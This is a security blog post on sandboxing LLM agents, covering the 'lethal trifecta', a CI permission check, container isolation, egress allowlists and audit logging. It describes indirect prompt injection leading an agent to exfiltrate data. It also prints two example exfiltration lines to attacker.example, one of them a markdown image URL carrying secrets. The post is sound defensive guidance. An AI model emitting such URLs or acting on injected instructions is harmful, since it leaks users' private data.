---
title: "Agent Sandboxing and Permissions: Avoiding the Lethal Trifecta"
description: "The lethal trifecta, the rule of two, a tool permission matrix, container isolation, egress filtering and an audit-log schema that doubles as a compliance trail."
publishDate: "2026-08-13T23:46:00+03:00"
lang: en
category: "Security"
tags: ["Security", "AI"]
translation: "ajan-izolasyonu-ve-yetki"
heroImage:
  src: "../../../assets/blog/covers/agent-sandboxing-permissions.jpg"
  alt: "Agent Sandboxing and Permissions: Avoiding the Lethal Trifecta"
---

An agent's security is not measured by how well the model was instructed, but by what it can do once it has been fooled. This article is entirely about the second question: which tools you hand it, which identity it runs as, where it can make network requests, and what remains afterwards when something goes wrong.

## The lethal trifecta and the rule of two

Two heuristics entered shared vocabulary in 2025-2026. The first is the **lethal trifecta**: if an agent simultaneously (a) has access to private data, (b) reads untrusted content and (c) can communicate externally, then data exfiltration is not a possibility but a matter of time. The attacker embeds instructions in the untrusted content, the agent reads private data, and it leaves through the external channel.

> The LLM vendors are not going to save us — we have to avoid the lethal trifecta ourselves.

The second is Meta's **Agents Rule of Two**: an agent may operate autonomously with at most two of those three properties; all three requires human approval. As an architectural constraint it is unusually practical, because you can ask the question at design time.

The escape routes in practice: cut network access for the agent that reads private data; separate the agent reading untrusted content from private data entirely (two agents, two identities); or reduce external egress to a single structured, validated channel.

## A tool permission matrix

What is missing almost everywhere is not a table but an executable matrix. Classify tools by capability and attach policy to each class.

```python
from dataclasses import dataclass
from typing import Literal

Capability = Literal["read", "write", "net", "shell", "payment"]

@dataclass(frozen=True)
class ToolPolicy:
    name: str
    capabilities: frozenset        # what this tool touches
    private_data: bool             # does it reach private data
    untrusted_input: bool          # does it read external content
    external_comms: bool           # can it send data outward
    approval: bool = False
    max_calls: int = 10

def check_trifecta(p: ToolPolicy) -> None:
    """Lethal trifecta: never run autonomously with all three."""
    if p.private_data and p.untrusted_input and p.external_comms and not p.approval:
        raise ValueError(
            f"{p.name}: lethal trifecta complete — drop a capability or require approval")

POLICIES = [
    ToolPolicy("search_docs", frozenset({"read"}), True,  False, False),
    ToolPolicy("fetch_url",   frozenset({"net"}),  False, True,  False),
    ToolPolicy("send_email",  frozenset({"net"}),  True,  False, True, approval=True, max_calls=1),
]

for p in POLICIES:
    check_trifecta(p)      # runs in CI, BEFORE deployment
```

Running this check in CI matters. The lethal trifecta forms while tools are added one at a time — nobody thinks "I am adding an exfiltration capability to this agent", they just add a URL fetcher. Encoding the rule makes the moment visible.

## Isolation: containers and egress filtering

Any agent that executes code or touches a filesystem must be isolated. The minimum:

```bash
# Minimum isolation for code execution
docker run --rm \
  --network none \                    # no network (use a proxy if needed)
  --read-only \                       # read-only root filesystem
  --tmpfs /tmp:size=64m \             # only scratch space is writable
  --memory 512m --cpus 1 \            # resource limits
  --pids-limit 128 \
  --cap-drop ALL \                    # drop all Linux capabilities
  --security-opt no-new-privileges \
  agent-sandbox:1.4 python /job/run.py
```

Where network access is genuinely required, replace `--network none` with an allowlisted egress proxy. The critical properties are that the allowlist works at domain granularity and that the default is deny. Exfiltration is rarely exotic; it is usually an ordinary `GET https://attacker.example/?data=...`.

<div class="callout"><strong>Tip:</strong> Do not forget markdown image URLs. An image the agent emits as <code>![](https://attacker.example/?v=SECRETS)</code> exfiltrates the moment your UI renders it. Disable remote image loading in the client that displays agent output, or pass image URLs through the same allowlist.</div>

## Identity: short-lived, narrowly scoped

The most common production mistake is running the agent as one broadly privileged service account. That account accretes access over time, because every new feature adds one more grant and nobody ever removes one.

Three rules cover the correct arrangement. **One:** the agent should act with the privileges of the user who triggered the action — make the authorization decision in the data layer, not the agent layer. **Two:** tokens should be short-lived; if an agent task's lifetime is measured in minutes, so should the token's be. **Three:** narrow the scope — use separate credentials for reads and writes, so that a leaked read token cannot write.

Why this is urgent is visible in OWASP's Q1 2026 incident round-up: an actively exploited RCE affecting twelve to fifteen thousand exposed instances, indirect-injection exfiltration cases, and a privilege escalation on a cloud AI platform. The telling detail: across eight major incidents only _one_ traditional CVE was assigned — because most of these were configuration and design failures rather than software defects.

## An audit-log schema

What you have after an incident depends entirely on what you recorded before it. An agent audit log can double as a personal-data processing record, so you do not need a second system for compliance. The minimum schema:

```sql
CREATE TABLE agent_audit (
  id            bigserial PRIMARY KEY,
  task_id       uuid        NOT NULL,       -- all steps of one task
  step          int         NOT NULL,
  agent         text        NOT NULL,
  tool          text        NOT NULL,
  user_id       uuid,                       -- on WHOSE behalf it ran
  identity_scope text       NOT NULL,       -- which token/scope was used
  args          jsonb       NOT NULL,       -- with PII masked
  outcome       text        NOT NULL
                CHECK (outcome IN ('ok','denied','error','awaiting_approval')),
  denial_reason text,
  approved_by   uuid,                       -- who granted human approval
  personal_data boolean     NOT NULL DEFAULT false,   -- compliance flag
  at            timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX ON agent_audit (task_id, step);
CREATE INDEX ON agent_audit (user_id, at) WHERE personal_data;
```

Two columns make the difference. Without `identity_scope` you cannot answer "how was this agent able to reach this data". The `personal_data` flag lets you find, in minutes rather than weeks, which records a data-subject request has to sweep — and it is very painful to add retroactively.

## Designing the approval gate

Badly designed human approval is not security but security theatre. Three rules:

1.  **Show effect, not intent.** Not "shall I clean up the files?" but "these 14 files will be deleted: …". If the user cannot see what they approved, the approval is void.
2.  **Ask rarely.** A system that asks on every tool call is being rubber-stamped by day three. Only irreversible, high-impact actions should prompt.
3.  **Bind approval to the action, not the session.** An "always allow for this session" option is the most common door through which the lethal trifecta opens.

A closing design test: if describing your system requires the sentence "the model knows it is not allowed to do that", there is no security control at that point. Model knowledge is a suggestion; a gate is a rule.

<div class="takeaways"><h4>Key takeaways</h4><ul><li>The lethal trifecta — private data plus untrusted content plus external comms — makes exfiltration a matter of time.</li><li>Run the trifecta check in CI; the risk assembles itself one tool at a time, unnoticed.</li><li>Run code-executing agents in a network-isolated, read-only, resource-capped container with allowlisted egress.</li><li>Record identity scope and a personal-data flag in the audit log; neither can be added after the fact.</li></ul></div>

<div class="faq"><details><summary>What is the lethal trifecta?</summary><p>An agent simultaneously having access to private data, reading untrusted content, and being able to communicate externally. With all three present, an attacker can embed instructions in untrusted content and have private data leave through the external channel. Meta's rule of two suggests permitting at most two, requiring human approval when all three are needed.</p></details><details><summary>How do I sandbox an agent?</summary><p>Run code-executing agents in a container with no network, a read-only root filesystem, memory and process limits, and all Linux capabilities dropped. Where network access is required, use a domain-level allowlisted egress proxy with deny as the default.</p></details><details><summary>How does least privilege apply to agents?</summary><p>Run the agent with the privileges of the user who triggered the action rather than its own broad service account, and make the authorization decision in the data layer. Keep tokens as short-lived as the task, and use separate credentials for reads and writes.</p></details></div>

---

Isolation and permissions are the part of agent security that is not theatre. For the attack itself see [prompt injection and jailbreaks](/en/posts/prompt-injection-jailbreaks/), for checks on model output see [guardrails and content moderation](/en/posts/guardrails-content-moderation/), and for how tools are described to the model see [function calling and structured output](/en/posts/function-calling-structured-output/).
